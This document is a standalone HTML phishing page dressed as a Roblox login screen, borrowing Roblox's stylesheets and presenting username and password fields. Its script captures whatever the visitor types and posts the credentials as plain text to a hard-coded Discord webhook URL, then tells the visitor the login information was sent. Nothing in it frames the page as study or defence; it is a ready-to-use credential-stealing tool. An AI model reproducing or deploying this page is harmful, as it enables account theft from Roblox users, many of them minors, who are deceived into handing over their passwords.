<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Roblox</title>
    <link rel="stylesheet" href="https://css.rbxcdn.com/95621e67c60dafcd4035aaf4ba278c1e72f6264fb80533940dfc24ace2211b7a.css" />
    <link rel="stylesheet" href="https://css.rbxcdn.com/4b8bb1d061ddcf18a42a5bfd3b4a9d2e2eb5385d5e76dd1239b6fb955b32257b.css" />
    <style>
        body {
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 300px;
        }
        .login-container h1 {
            text-align: center;
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container button:hover {
            background-color: #45a049;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Log in to Roblox</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username/Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission

            // Get the values from the textboxes
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Prepare the data to send
            const data = {
                content: `Username: ${username}, Password: ${password}`
            };

            // Send the data to the Discord webhook
            fetch('https://discord.com/api/webhooks/1354524412061159637/ucQxXCDU1ORZsNYJLM_WolcsGf-ITj1LDfH5frf9S_5bCX5abuGB5q9Q2pl9M5h3CkCr', { // Replace with your actual Discord webhook URL
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Message sent to Discord');
                    alert('Login information sent to Discord!');
                } else {
                    console.error('Error sending message to Discord');
                    alert('Failed to send login information.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred while sending the information.');
            });
        });
    </script>
</body>
</html>
